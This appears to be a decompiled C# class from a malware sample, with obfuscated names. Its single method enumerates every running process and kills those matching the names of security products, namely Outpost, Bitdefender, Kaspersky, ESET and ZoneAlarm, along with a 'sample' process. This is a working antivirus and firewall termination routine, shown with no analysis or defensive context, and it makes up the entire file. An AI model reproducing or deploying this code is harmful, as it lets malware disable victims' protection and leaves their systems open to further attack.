using System.Diagnostics;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

[StandardModule]
internal sealed class Class5
{
	public static void smethod_0()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("sample"), false) == 0)
				{
					processes[i].Kill();
				}
				if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("outpost"), false) == 0)
				{
					processes[i].Kill();
				}
				if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("npfmsg"), false) == 0)
				{
					processes[i].Kill();
				}
				if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("bdagent"), false) == 0)
				{
					processes[i].Kill();
				}
				if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("kavsvc"), false) == 0)
				{
					processes[i].Kill();
				}
				if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("egui"), false) == 0)
				{
					processes[i].Kill();
				}
				if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("zlclient"), false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}
}
